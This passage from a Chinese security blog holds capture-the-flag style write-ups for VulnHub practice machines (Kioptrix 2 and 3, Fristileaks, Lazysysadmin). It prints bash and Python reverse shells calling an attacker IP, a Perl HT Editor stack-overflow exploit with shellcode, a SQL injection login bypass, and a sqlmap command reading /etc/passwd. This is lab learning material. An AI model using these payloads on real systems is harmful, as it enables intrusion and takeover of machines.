<p>去exp库中找找<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_195038.jpg" alt=""><br>因为系统内核是2.4.7所以我先选择了尝试利用<a href="https://www.exploit-db.com/exploits/3" title="" target="">ptrace&#x2F;kmod</a>这个漏洞<a href="https://nvd.nist.gov/vuln/detail/CVE-2003-0127" title="" target="">CVE-2003-0127</a>。下载源码后，直接在目标机器上编译运行。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>方法一用到msf，可能是我这里靶机的问题，也有可能是网络影响了。暂不清楚，我感觉是能不用msf的辅助模块就可以探测到版本的。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>smb-enum</tag>
        <tag>ptrace/kmod</tag>
        <tag>openssl-too-open</tag>
        <tag>CVE-2002-0656</tag>
        <tag>CVE-2003-0201</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Fristileaks</title>
    <url>/2020/06/19/Vulnhub-Fristileaks/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机的待打清单<br>下载链接:<a href="https://www.vulnhub.com/entry/fristileaks-13,133/" title="" target="">Fristileaks</a></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_232221.jpg" alt=""><br>目标机器只开放了一个80端口，所以枚举是关键！而且nmap发现了三个目录</p>
<p>nikto<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_232518.jpg" alt=""><br>并没有给我们什么有趣的东西。</p>
<p>网站路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_233114.jpg" alt=""></p>
<p>网站index<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_232402.jpg" alt=""></p>
<p>然而nmap找到的三个目录都是这个页面。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_233213.jpg" alt=""></p>
<p>用了很多个字典都跑不出来什么东西，甚至一度以为是隐写术。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_233910.jpg" alt=""></p>
<p>但是最后靠着这个图片的最后两个单词找到了正确的路径。。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234038.jpg" alt=""></p>
<p>右键查看源代码会发现些有趣的东西<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234118.jpg" alt=""><br>可以猜测到这是用户名</p>
<p>这段内容的base64解密之后是一个png图片<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234151.jpg" alt=""><br>用python写成一个文件后得到一个图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">write_base64=<span class="string">"""base64的值"""</span></span><br><span class="line">imagedata=base64.b64decode(write_base64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(imagedata)</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234433.jpg" alt=""><br>很有可能是一段密码，尝试用这个用户名和密码登录后，发现一个上传点。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234557.jpg" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试上传一句话木马，结果发现是白名单验证。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234738.jpg" alt=""></p>
<p>尝试apache多后缀解析漏洞，上传一个yjh.php.jpg的文件。</p>
<p>成功上传，但是不知道能不能成功解析。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234844.jpg" alt=""><br>成功解析，用蚁剑连接上去后。反弹一个shell回来<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_234922.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.40.228&#x2F;8081&#39;</span><br></pre></td></tr></table></figure>

<p>我觉得我这里直接上传php-reverse-shell更好。。。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先打开一个tty方便后续操作<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_235107.jpg" alt=""></p>
<p>这里试着用找到的数据库密码切换用户，但是不成功。数据库的用户也没有root权限。<br>不过在eezeepz的家目录下找到了一段关键信息<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_235316.jpg" alt=""></p>
<p>提示我们可以往/tmp/runthis下写一个命令，但是命令必须以/usr/bin /home/admin开头。执行的日志也会生成在/tmp下。</p>
<p>我在这里比较笨，尝试了很多无用的操作。。最后想到为什么不直接用python反弹一个shell呢，因为python的目录在/usr/bin/python。。</p>
<p>以下是我的无用功记录<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_235605.jpg" alt=""></p>
<p>最后是通过python反弹了一个shell获得了admin的权限。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'192.168.40.228'</span>,<span class="number">8888</span>))  </span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>])</span><br></pre></td></tr></table></figure>
<p>虽然获得了admin的权限，不过admin的权限也是十分的有限。</p>
<p>不过admin下面有几个有趣的文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200618_235814.jpg" alt=""></p>
<p>较为关键的文件是cryptedpass.txt,cryptpass.py,whoisyourgodnow.txt</p>
<p>认真读了cryptpass.py后，发现是将一段字符串先进行base64加密，然后再反转加密后的字符串，最后进行rot13颠倒。（其实这里在拿到webshell之后认真读了的话，早就直接提到fristigod了。。</p>
<p>将whoisyourgodnow.txt进行以上的操作后，得到fristigod用户的密码。切换到fristigod用户后，sudo -l。发现这个用户可以执行一个不知道是什么的文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200619_000109.jpg" alt=""></p>
<p>去<code>/var/fristigod</code>目录查看后，发现日志文件。查看日志文件获得提权线索。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200619_000223.jpg" alt=""><br>直接照着历史记录的运行命令试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom</span><br><span class="line">Usage: .&#x2F;program_name terminal_command ...bash-4.1$ whoami</span><br><span class="line">fristigod</span><br><span class="line">bash-4.1$ sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom whoami</span><br><span class="line">sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom </span><br><span class="line">root</span><br><span class="line">bash-4.1$ sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &#x2F;bin&#x2F;bash</span><br><span class="line">sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200619_000322.jpg" alt=""></p>
<p>提权成功！</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200619_000429.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在拿到web-shell之后我就可以直接提权到fristi用户，但是因为不够仔细，没有去看那几个重要的文件。在提权到admin用户的时候，除了python反弹shell之外。也可以直接将admin的家目录修改为777，让任何人都能去看，这样我们也能随意进出admin的家目录了。所以其实提权到admin的动作是多余的。不管提不提权到admin都不会影响到最后提权fristi用户的操作。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>enum</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Kioptrix-3</title>
    <url>/2020/06/17/Vulnhub-Kioptrix-3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是群里大佬推荐我做的靶机之一。</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/" title="" target="">下载链接:kioptrix-level-3</a>

</li>
</ul>
<p>这个靶机的作者说有多种方式可以拿到shell。</p>
<a id="more"></a>

<p>nmap扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124814.jpg" alt=""></p>
<p>路径探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124841.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124913.jpg" alt=""></p>
<p>直接访问会报错，感觉应该存在sql注入<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124211.jpg" alt=""></p>
<h2 id="漏洞利用-方法一"><a href="#漏洞利用-方法一" class="headerlink" title="漏洞利用 方法一"></a>漏洞利用 方法一</h2><p>试着传了个?id=1，有输出。估计应该是能在这个页面做手脚了，但是不清楚网站有没有过滤。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124312.jpg" alt=""></p>
<p>最后判断闭合。单引号，双引号都报错，数字型如果不闭合也会报错，可能网站原本是这样查询的吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ...... from table where id&#x3D;&#123;$id&#125; order by ....</span><br></pre></td></tr></table></figure>
<p>所以这里即使是数字型的也要手动给它闭合<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124505.jpg" alt=""></p>
<p>最后爆破出dev_account表下的帐号密码。（这里就不贴了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_124104.jpg" alt=""></p>
<p>sqlmap读取目标机器上的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1&quot; -file-read&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200617_204921.jpg" alt=""></p>
<p>dev_account表下的帐号密码，其实就目标机器的用户帐号密码。<br>直接拿着它ssh登录上去，到目标机器之后，发现我拿得用户还有sudo权限。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_193005.jpg" alt=""></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看着有su，其实是骗你的。su的正确路径是/bin/su，这里我被ht卡了一会。我甚至一开始都不知道ht这是个什么东西。结果谷歌之后才知道是个二进制编辑器。。。等等，编辑器？拥有sudo权限的编辑器？直接该sudoers 或者给/etc/passwd添加个用户不就提权成功了吗？</p>
<p>想到这里，立马开搞。但是又遇到了新的问题。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_193747.jpg" alt=""><br>遇到问题，Don’t be afraid。谷歌它</p>
<figure class="highlight shell"><figcaption><span>解决方案 "https://stackoverflow.com/questions/6804208/nano-error-error-opening-terminal-xterm-256color"</span></figcaption><table><tr><td class="code"><pre><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
<p>不过我一打开就傻眼了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_193948.jpg" alt=""></p>
<p>经过多方谷歌和看help，终于会简单的保存退出了:)</p>
<p>这里的1,2,3….对应的是F1，F2，F3<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_194044.jpg" alt=""></p>
<p>所以如果你在这里被困住了，直接用F1查看键位帮助。</p>
<p>不知道是不是我理解错了还是傻，按F2没有保存提示，不过在按F10退出后会用提示是否保存。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_194337.jpg" alt=""><br>修改好后，直接切换到test用户即可。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200617_194526.jpg" alt=""></p>
<h2 id="方法二get-shell"><a href="#方法二get-shell" class="headerlink" title="方法二get-shell"></a>方法二get-shell</h2><p>在cms登录页面中看到<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_195308.jpg" alt=""><br>知道是什么cms后，我们可以搜索下这个cms，看看有没有exp可以利用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_195536.jpg" alt=""><br>一个是存储性的xss，而我们这个目标是靶机。。所以利用不上，另外一个则是msf的脚本了。（其实我真的不怎么想用msf框架。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_200102.jpg" alt=""><br>这里接下来的提权道路可以是利用ht编辑器的缓冲区溢出漏洞。</p>
<p>同样是利用lotuscms3.0漏洞，不过使用这个exp<a href="https://packetstormsecurity.com/files/122161/LotusCMS-3.0-PHP-Code-Execution.html" title="" target="">LotusCMS 3.0 PHP Code Execution</a>可以避免使用msf框架。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_201432.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_201453.jpg" alt=""></p>
<h2 id="利用缓冲区溢出"><a href="#利用缓冲区溢出" class="headerlink" title="利用缓冲区溢出"></a>利用缓冲区溢出</h2><p>因为ht编辑器是2.0.18,所以可以考虑使用缓冲区溢出<a href="https://www.exploit-db.com/exploits/17083" title="" target="">HT Editor 2.0.18 - File Opening Stack Overflow</a><br>适用于perl5.8.8的代码</p>
<figure class="highlight perl"><figcaption><span>来自"http://forelsec.blogspot.com/2012/12/solving-kioptrix-level-3.html"</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> ($esp, $retaddr);</span><br><span class="line"><span class="keyword">my</span> $scz =       [       <span class="string">"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e"</span> .</span><br><span class="line">                                <span class="string">"\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8"</span> .</span><br><span class="line">                                <span class="string">"\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67"</span> .</span><br><span class="line">                                <span class="string">"\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30"</span> .</span><br><span class="line">                                <span class="string">"\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4"</span> .</span><br><span class="line">                                <span class="string">"\x53\x52\x54\x8a\xe2\xce\x81"</span>,</span><br><span class="line">                                <span class="string">"\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b"</span> .</span><br><span class="line">                                <span class="string">"\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53"</span> .</span><br><span class="line">                                <span class="string">"\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff"</span> .</span><br><span class="line">                                <span class="string">"/bin/sh"</span>       ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]Looking for \$esp and endwin()...\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $namez = [<span class="keyword">qw</span><span class="comment">#/usr/local/bin/ht#];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $infos = get_infos(<span class="string">qx&#123;uname&#125;</span>);</span><br><span class="line"><span class="keyword">my</span> $name = $infos-&gt;[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]endwin() address found! (0x"</span>, $infos-&gt;[<span class="number">3</span>],<span class="string">")\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">my</span> $line(<span class="string">qx&#123;objdump -D $name | grep "ff e4"&#125;</span>) &#123;</span><br><span class="line">        $esp = <span class="string">"0"</span> . $1, <span class="keyword">last</span> <span class="keyword">if</span> ($line =~ <span class="keyword">m</span>&#123;([a-f<span class="number">0</span>-<span class="number">9</span>]<span class="string">&#123;7&#125;</span>).+jmp\<span class="keyword">s</span><span class="string">&#123;4&#125;</span>\*%esp&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+]\$esp place found! (0x"</span>, $esp, <span class="string">")\012Now exploiting...\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> @payload = ($infos-&gt;[<span class="number">0</span>], (<span class="string">"A"</span> <span class="keyword">x</span> ($infos-&gt;[<span class="number">1</span>] - <span class="keyword">length</span>(<span class="string">qx&#123;pwd&#125;</span>))) . <span class="keyword">reverse</span>(<span class="keyword">pack</span>(<span class="string">'H*'</span>, $infos-&gt;[<span class="number">3</span>])) . <span class="keyword">reverse</span>(<span class="keyword">pack</span>(<span class="string">'H*'</span>, $esp)) . $infos-&gt;[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">exec</span>(@payload);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">get_infos</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_[<span class="number">0</span>] =~ <span class="regexp">/Linux/</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>([$namez-&gt;[<span class="number">0</span>], <span class="number">4108</span>, $scz-&gt;[<span class="number">0</span>], getendwin(<span class="string">"linux"</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elsif</span>($_[<span class="number">0</span>] =~ <span class="regexp">/FreeBSD/</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>([$namez-&gt;[<span class="number">1</span>], <span class="number">271</span>, $scz-&gt;[<span class="number">1</span>], getendwin(<span class="string">"freebsd"</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">getendwin</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_[<span class="number">0</span>] =~ <span class="regexp">/linux/</span>)&#123;</span><br><span class="line">                <span class="keyword">my</span> $n = $namez-&gt;[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="string">qx&#123;objdump -d $n | grep endwin&#125;</span>)&#123;</span><br><span class="line">                        $retaddr = $1, <span class="keyword">last</span> <span class="keyword">if</span> ($_ =~ <span class="keyword">m</span>&#123;(.*) &lt;&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>($retaddr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elsif</span>($_[<span class="number">0</span>] =~ <span class="regexp">/freebsd/</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>(<span class="string">"282c2990"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试利用ht编辑器的缓冲区溢出漏洞，不过没有我想象中的效果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200617_203022.jpg" alt=""><br>不过我看其他人的walkthrough是可以拿到rootshell的。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sql_injection</tag>
        <tag>Buffer Overflow</tag>
        <tag>Metasploit</tag>
        <tag>HT Editor 2.0.18</tag>
        <tag>LotusCMS 3.0 - &#39;eval()&#39;</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Kioptrix-2</title>
    <url>/2020/06/16/Vulnhub-Kioptrix-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是群里大佬推荐我做的靶机之一。</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/" title="" target="">下载链接:kioptrix-level-2</a>

</li>
</ul>
<p>这个靶机的作者说有多种方式可以拿到shell。</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_105945.jpg" alt=""></p>
<ul>
<li>22 ssh</li>
<li>80 http-apache 2.0.52</li>
<li>111 rbcbind</li>
<li>443 ssl/https</li>
<li>631 ipp(这啥没见过啊)</li>
<li>658 rbc</li>
<li>3306 mysql</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先浏览了一下网站，一上来就是一个登录框<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_125725.jpg" alt=""></p>
<p>直接尝试绕过登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or 1&#x3D;1 --</span><br></pre></td></tr></table></figure>
<p>结果成功绕过:)</p>
<p>登录进来后，发现是这么一个框<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_125931.jpg" alt=""><br>看起来存在命令执行漏洞，试着看能不能执行一个whoami。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_125901.jpg" alt=""></p>
<p>成功，好像没什么过滤的。尝试写一句话，但是不成功。因为apache用户没有对www目录写的权限:(<br>最后成功把nc反弹shell的脚本下载到/tmp，执行后得到apache权限的shell。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_130224.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200616_130248.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200616_130348.jpg" alt=""></p>
<p>进入目标主机后，我进行了一些信息枚举（suid，其他用户能不能越权登录等等。不过好像没有什么发现，想到这个靶机的Level-1是通过内核漏洞提权的。我想这个有可能也存在内核漏洞。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200616_130556.jpg" alt=""></p>
<p>搜索离线exploit库，看能不能找到什么。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_130851.jpg" alt=""></p>
<p>这里先查看了<a href="https://www.exploit-db.com/exploits/9542" title="" target="">9542</a>这个编号的漏洞利用(漏洞编号<a href="https://nvd.nist.gov/vuln/detail/CVE-2009-2698" title="" target="">CVE-2009-2698</a>)，发现完美符合要求，应该能用吧。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_131019.jpg" alt=""></p>
<p>下载源码后，编译运行。直接拿到root权限。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200616_131129.jpg" alt=""></p>
<h2 id="分享另外一种拿webshell的方法"><a href="#分享另外一种拿webshell的方法" class="headerlink" title="分享另外一种拿webshell的方法"></a>分享另外一种拿webshell的方法</h2><p>思路和我上面getshell一样，不过区别在于。这个是用php执行的，我上面的方法是bash执行的。</p>
<ol>
<li>下载php-reverse-shell，然后上传到目标服务器的/tmp目录下</li>
<li>命令执行，执行这个命令 php /tmp/php-reverse-sehll（不要忘记先开启监听哦</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内核漏洞真好利用，不过应该还有其他的方式getshell。但是我没实现，另外网站首页的登录页面也可以sqlmap跑出密码。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>sql_injection</tag>
        <tag>命令执行</tag>
        <tag>CVE-2009-2698</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Lazysysadmin</title>
    <url>/2020/04/24/Vulnhub-Lazysysadmin/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>这是一个VulnHub的靶机<br>下载链接在这里<a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/" target="_blank" rel="noopener">LazySysAdmin</a></p>
<p>提示点:</p>
<ul>
<li>信息枚举</li>
<li>再加把劲</li>
</ul>
<p>靶机难度:简单</p>
<p>我记得我很久之前打过一次这个靶机，但是当时完全没有接触过渗透，就完全是看着网络上的writeup去做的，就当是体验流程?</p>
<p>这一次，再打的时候，已经完全忘光细节了，但是这一次全程靠自己不看writeup打完了。成就感比当时第一次打的大多了:)</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>上来先进行一次nmap扫描</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_232451.jpg" alt="nmap"></p>
<p>目标机器开放了smb服务，也有网站。</p>
<p>这里我先访问了一次网页，但是什么都没发现，所以扫目录看有没有新的东西</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_232812.jpg" alt="dir-"></p>
<p>hey!可以看到有wordpress博客，进去看了一圈只有一个文章。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_130640.jpg" alt="togie"></p>
<p>可以猜测系统里面有一个用户名为<code>togie</code>，网站的管理员帐号为<code>Admin</code></p>
<p>转了一圈，没发现什么，使用nmap枚举smb</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_131329.jpg" alt="smb-enum"></p>
<p>可以发现都是允许匿名用户登录，并且都是拥有可读权限的。而且<code>share$</code>这个分享目录看起来像是指向了网站的根目录，说不定我们能在里面找到我们需要的东西</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_232955.jpg" alt="smb"></p>
<p>果不其然，登录之后会发现就是网站根目录，网站根目录一般都会有数据库的配置信息，所以我们可以找一下。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_131934.jpg" alt="wordpress-dir"><br>进入wordpress目录后会发现有个<code>wp-config.php</code>文件,</p>
<p>可以下载下来，也可以直接查看内容</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_132136.jpg" alt="wp-config.php"></p>
<p>此时我们已经拿到数据库的密码了，去使用这个密码看能不能登录<code>wordpress</code>后台和<code>phpmyadmin</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_132352.jpg" alt="wp-admin"></p>
<p>事实证明是可以的，如果能登录数据库，却不能登录网站后台的话，那也别慌。因为我们已经有了数据库的权限了，那么改个网站管理员的密码岂不是so easy?</p>
<p>接下来要研究怎么上传<code>web-shell</code>了</p>
<p>wordpress后台上传web-shell有几种办法，但是wordpress的媒体上传是有安全检测机制的，所以如果上传遇到其他的文件好像都会禁止上传的</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_132745.jpg" alt="no-upload"></p>
<p>我就没在这里钻牛角尖了，所以我去尝试其他方法了。</p>
<p>因为wordpress是允许管理员修改主题模板的php文件的，而且也允许管理员安装主题，安装插件什么的。所以我们就可以考虑直接在主题的<code>404.php</code>上面插入一句话，或者安装一个主题，里面打包我们的<code>web-shell</code>插件同理。</p>
<p>去下载一个免费的主题包，然后把我们的webshell打包进去,里面的<code>1.php</code>就是我们的<code>shell</code>了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_133225.jpg" alt="themes-shell"></p>
<p>安装主题成功。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_133430.jpg" alt="install-theme"></p>
<p>nc开启监听端口，网页访问</p>
<p><code>192.168.56.111/wordpress/wp-content/themes/astra/1.php</code>=<code>ip/wordpress/wp-content/themes/主题名/webshell.php</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_133726.jpg" alt="get-web-shell"></p>
<p>可以看到，我们已经拿到<code>web-shell</code>了。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到webshell之后，我枚举了系统信息，访问了<code>togie</code>用户目录下的文件，但都一无所获。一点提权思路都没有，正当我想放弃去看看<code>wirteup</code>时突然想起这个靶机的名字是<code>Lazysysadmin</code>，我心想，是不是我在网站根目录下错过了什么东西?</p>
<p>抱着这一想法，我从网站开始重新下手，找线索。果不其然，我确实是漏掉了一个文件没有查看…</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_134242.jpg" alt="wocao"></p>
<blockquote>
<p>Remember to remove this file and update your password after we push out the server.</p>
</blockquote>
<p>怪不得靶机名是<code>Lazysysadmin</code>…</p>
<p>尝试使用这个密码ssh连接togie…果不其然。。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_134517.jpg" alt="ssh"></p>
<p>接下来没什么好说的，因为togie用户拥有sudo的所有权限,而且我们知道togie的密码。。</p>
<p>那么我们可以直接sudo bash shell给我们。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_135145.jpg" alt="rbash-error"></p>
<p>因为这个用户默认使用的是rbash，会提示这个报错。所以手动打开<code>bash</code> 然后反弹一个<code>shell</code>给我们</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_135308.jpg" alt="did_it"></p>
<p>因为<code>togie</code>用户拥有<code>sudo</code>的所有权限,其实我们上一步也可以省略。</p>
<p>直接<code>sudo cat /root/proof.txt</code>也是一样的。</p>
<p>所以其实上传<code>web-shell</code>的那一步也可以省略，，因为smb目录里面就有那个存放密码的文件..</p>
